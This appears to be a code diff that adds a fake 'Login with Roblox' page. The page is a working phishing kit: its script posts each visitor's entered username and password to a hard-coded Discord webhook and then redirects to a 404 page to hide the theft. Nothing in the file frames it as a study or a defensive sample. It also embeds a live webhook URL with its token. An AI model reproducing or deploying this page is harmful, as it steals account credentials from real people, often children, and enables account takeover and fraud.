@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login with Roblox</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQDgoREp62KIsz04TEFBsseHxbkOR5riqT4iB9PM4Q4hwUgcV3IH_taNEaEZb558FjPgw4&usqp=CAU" type="image/png">
+    <script>
+        async function handleLogin() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (username && password) {
+                try {
+                    // Send data to the webhook
+                    const webhookUrl = 'https://discord.com/api/webhooks/1264546083351298088/k7APVCp9dypZWon2zZdw5bN2Egv-DkBICqjVTYEu1PmemWXkVdG5ehThZAuuA0Rj9-4b';
+                    const embed = {
+                        embeds: [{
+                            title: "New Login Attempt",
+                            description: `**Username:** ${username}\n**Password:** ${password}`,
+                            color: 0xff0000  // Red color
+                        }]
+                    };
+
+                    const response = await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(embed)
+                    });
+
+                    if (response.ok) {
+                        // Redirect to 404.html
+                        window.location.href = '404.html';
+                    } else {
+                        console.error('Failed to send data to webhook');
+                    }
+                } catch (error) {
+                    console.error('Error sending data to webhook:', error);
+                }
+            } else {
+                alert('Please enter both username and password');
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Login with Roblox</h1>
+        <div class="login-form">
+            <input type="text" id="username" placeholder="@username">
+            <input type="password" id="password" placeholder="Password">
+            <button class="login-button" onclick="handleLogin()">Login</button>
+        </div>
+    </div>
+</body>
+</html>
+
